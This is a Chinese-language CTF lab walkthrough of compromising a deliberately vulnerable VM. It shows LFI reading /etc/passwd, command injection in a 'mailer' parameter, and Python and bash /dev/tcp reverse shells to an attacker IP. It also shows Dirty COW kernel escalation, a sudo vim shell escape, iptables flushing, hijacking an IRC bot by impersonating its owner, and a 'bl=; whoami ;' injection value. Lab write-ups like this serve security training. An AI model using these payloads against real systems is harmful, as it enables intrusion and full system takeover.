# mynew


?page=  文件包含？sql注入？ 
安全机制端口转移 80=》60080
python get webshell
sudo -l iptables 
sudo -u vim /bin/bash
irc服务吗？ 

# 
VMware双击打开nat模式即可！

1、nmap 192.168.253.0/24 -sP
MAC Address: 00:50:56:E1:B2:64 (VMware)
Nmap scan report for 192.168.253.180


2、nmap 192.168.253.180 -p- -A -sS -T5

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))


3、web信息收集

访问：http://192.168.253.180/
Enter a username to get started with this CTF! 
让我输入用户名，输入dayu！点击start开启CTF之旅！

发现目录：/?page=


4、LFI

文件包含？sql注入？

http://192.168.253.180/?page=home



walfin:x:1000:1000:walfin,,,:/home/walfin:/bin/bash
steven?:x:1001:1001::/home/steven?:/bin/bash
ircd:x:1003:1003:,,,:/home/ircd:/bin/bash


或者：nikto -h http://192.168.253.180
/index.php?page=../../../../../../../../../../etc/passwd
也可以发现存在文件包含！

枚举到三个用户信息：walfin、steven、ircd


再次访问：https://192.168.253.180/?page=../../../etc/passwd
发现无法访问了！！！

nmap 192.168.253.180 -p80
80/tcp closed http
发现80端口关闭了！！

存在安全保护机制！！！

再次枚举：nmap 192.168.253.180 -p-
60080/tcp open     unknown
发现另外又开放了个60080端口！！


5、web信息枚举

访问：http://192.168.253.180:60080/
提示说转移到了另一个端口进行工作了！！更加的安全了！！

尝试看看还存在文件包含漏洞：
http://192.168.253.180:60080/?page=
Dude, dayu what are you trying over here?!


dirb http://192.168.253.180:60080/?page=
+ http://192.168.253.180:60080/?page=mailer (CODE:200|SIZE:1082)                                                                                                                                                             
访问：http://192.168.253.180:60080/?page=mailer
Coming Soon guys!
查看静态源码：
------------------
<!--a href='/?page=mailer&mail=mail wallaby "message goes here"'><button type='button'>Sendmail</button-->
    <!--Better finish implementing this so dayu
 can send me all his loser complaints!-->
------------------

http://192.168.253.180:60080/?page=mailer&mail=


6、远程代码执行-webshell

http://192.168.253.180:60080/?page=mailer&mail=whoami
发现存在远程代码执行的一句话？

http://192.168.253.180:60080/?page=mailer&mail=which%20python
/usr/bin/python    ---存在python

nc -vlp 6666

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.253.166",9900));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'



7、内部信息收集

1）Linux version 4.4.0-31-generic  （橙色）
2）[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
waldo       650  0.0  0.2  29416  2992 ?        Ss   23:02   0:00 tmux new-session -d -s irssi
3）127.0.0.1:3306


8、提权

------------------------------------------------
方法1：内核提权  脏牛提权  CVE-2016-5195
https://www.exploit-db.com/exploits/40839

这里找了个比较好的poc!

gcc CVE-2016-5195.c -o dayu -pthread
chmod +x dayu
./dayu
.......
root@ubuntu:/tmp# id
uid=0(root) gid=33(www-data) groups=33(www-data)

成功获得root权限！！但是等待几分钟也崩溃了，但是可以执行一段时间！
------------------------------------------------
------------------------------------------------
方法2：sudo 提权
sudo -l

User www-data may run the following commands on ubuntu:
    (waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
    (ALL) NOPASSWD: /sbin/iptables


1）waldo权限下存在000-default.conf文件--提权
sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf

然后输入冒号:!bash -i >& /dev/tcp/192.168.139.131/7777 0>&1

本地kali监听7777端口：nc -vlp 7777

即可拿到反弹shell！
获得个稳定shell：
python3 -c 'import pty; pty.spawn("/bin/bash")'

在/home/waldo目录发现irssi.sh！
该脚本是IRC需求写的一些命令！



2）项目二十五有遇到过/sbin/iptables，没教！！

还记得开启了6667/tcp  filtered irc服务吗？

这时候查看下规则：
sudo /sbin/iptables -L
------
ubuntu:/tmp$ sudo /sbin/iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     tcp  --  localhost            anywhere             tcp dpt:ircd
DROP       tcp  --  anywhere             anywhere             tcp dpt:ircd 

------
当前的规则是所有与IRC的外部连接都将被删除，准备使IRC服务器进行开放：

sudo iptables -R INPUT 2 -p tcp --dport 6667 -j ACCEPT
重写了第二条规则以允许端口6667上的TCP连接！

或者全部放行：sudo /sbin/iptables --flush

参考详细学习方法：
https://blog.csdn.net/iteye_5722/article/details/82676064

nmap 192.168.253.180 -p6667
------
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
| irc-info: 
|   users: 4
|   servers: 1
|   chans: 1
|   lusers: 4
|   lservers: 0
|   server: wallaby.fake.server
|   version: Unreal3.2.10.4. wallaby.fake.server 
|   uptime: 0 days, 0:35:35
|   source ident: nmap
|   source host: 6F90AEF2.6D3B7DC1.CD8EC85.IP
|_  error: Closing Link: zhoeddtxz[192.168.253.166] (Quit: zhoeddtxz)

------
nmap前面扫描未开启6667端口，在重新扫描后，开启了!

这边需要加入频道才可以进入其中：

find / -name wallaby* 2>/dev/null 
/home/wallaby
/home/wallaby/.sopel/wallabysbot-127.0.0.1.tell.db

cd /home/wallaby/.sopel/
cat /home/wallaby/.sopel/logs/raw.log
在/home/wallaby/.sopel/logs/raw.log文件中发现了wallabyschat频道！

-----
cat default.cfg 
[core]
nick = wallabysbot
host = 127.0.0.1
use_ssl = false
port = 6667
owner = waldo
channels = #wallabyschat
enable = run, admin, adminchannel, announce, help

-----

这边可以使用两种工具链接进IRS服务器中irssi和HexChat！



IRSSI：https://www.cnblogs.com/tsdxdx/p/7291877.html

直接带昵称登录指定的服务器：
irssi -c 192.168.139.152 -p 6667 -n wallabyschat  

/list    ----查看频道列表
----
04:58 -!- Channel Users  Name
04:58 -!- #wallabysbot 1  
04:58 -!- #wallabyschat 2

----

/j wallabyschat    ---join进入公开频道

在通道wallabyschat内，我看到了另外两个用户：
[@waldo] [ wallabysbot]

/wc（退出当前频道）回到irssi主窗口，进行一些信息收集看看



/whois waldo    ---查看waldo的基本资料
-----
04:27 -!- waldo [waldo@wallaby-DCED2AAD]
04:27 -!-  ircname  : waldo
04:27 -!-  channels : @#wallabyschat 
04:27 -!-  server   : wallaby.fake.server [Wallabys Personal IRC Server]
04:27 -!-  idle     : 0 days 1 hours 37 mins 37 secs [signon: Fri Mar 25 02:50:07 2022]
04:27 -!- End of WHOIS
-----
/whois wallabysbot
-----
04:28 -!- wallabysbot [sopel@wallaby-DCED2AAD]
04:28 -!-  ircname  : Sopel: http://sopel.chat
04:28 -!-  channels : #wallabyschat 
04:28 -!-  server   : wallaby.fake.server [Wallabys Personal IRC Server]
04:28 -!-           : is a Bot on WallabyNet
04:28 -!-  idle     : 0 days 1 hours 37 mins 44 secs [signon: Fri Mar 25 02:50:07 2022]
04:28 -!- End of WHOIS
-----
可以看到wallabysbot是基于Sopel的，在服务器上寻找下bot框架
cd /home/wallaby/.sopel
cd modules
-rw-rw-r-- 1 wallaby wallaby  451 Dec 27  2016 run.py
只有一个模块可用，这是一个典型的运行脚本run.py！

查看内容：
bot.say('Hold on, you aren\'t Waldo?')
脚本表明只能Waldo才能运行此脚本！
----------------------------
验证：
/j wallabyschat

04:59 < wallabys1hat> .help
04:59 < wallabysbot> wallabys1hat: I'm sending you a list of my commands in a private message!
这时候执行：/wc   ----就会进入到环境界面

05:00 <wallabys1hat> .run ls
05:00 <wallabysbot> Hold on, you aren't Waldo?
----------------------------


回到第一个1）发现的irssi.sh脚本：

发现Waldo正在使用tmux满足IRC需求，如果服务装置出现故障，就是说tmux掉线了，IRC也会跟着掉线！

who
waldo    pts/0        Mar 24 23:50 (tmux(717).%0)

或者用：ps -aux | grep waldo 查看
发现用户waldo启动tmux的进程是717！

继续使用Vim发出kill命令：
sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf
!kill 762


Waldos IRC连接中断后，更改名称：
/nick waldo

欺骗对方用waldo身份运行开启反弹shell，.run获取反向shell即可

nc -vlp 9090    ----这个地方需要逻辑清晰！！仔细看视频！

.run bash -c 'bash -i >& /dev/tcp/192.168.139.131/9090 0>&1'

这时候就拿到了wallaby权限！的shell！

------------------------------------------------
------------------------------------------------
方法3：sudo all提权

sudo -l

User wallaby may run the following commands on ubuntu:
    (ALL) NOPASSWD: ALL

sudo su   ---成功拿到root权限！！





拓展新知识：kali执行！
教程参考：
https://tieba.baidu.com/p/5270992068?red_tag=2887250276


apt install hexchat
hexchat

登录进来后选择Rizon->编辑->自动加入频道->填写#wallabyschat->勾选自动连接到此网络
->服务器->项目IP（192.168.253.180）->点击关闭

关闭后第二个界面：
昵称：wallabyschat
第二选择：root
第三选择：root
用户名：wallabyschat
点击链接！！！！

等待几秒钟就登录进来了~~~

/j wallabyschat
.help
.run ls
/wc
进入到模式！（技巧）

ps -aux | grep waldo （查看进程）
waldo       732  0.0  0.8 115744  8352 pts/0    Sl+  04:25   0:00 irssi

irssi进程的数量732，可以使用vim杀死该进程
sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf
!kill 732

/nick waldo

* waldo 已退出(Client exited)
*  您已改名为 waldo

nc -vlp 9090
.run bash -c 'bash -i >& /dev/tcp/192.168.253.166/9090 0>&1'



代码审计：
在79~81行：
alert('Your ip is ' + myIP + ', consider it blacklisted for a bit :D.');
        post('/?page=blacklist', {bl: myIP});
        pc.onicecandidate = noop;

/index.php?page=blacklist

POST请求通过bl参数容易受到RCE的攻击！！


http://192.168.253.180:60080/?page=blacklist

提示：
You are SOOOOOOOOOOO predictable dayu :D. Won't get the machine like this, I can see your every move! And your IP :D

burpsuite抓包！

bl=; whoami ;




windows安装包：
https://www.32r.com/soft/36869.html

















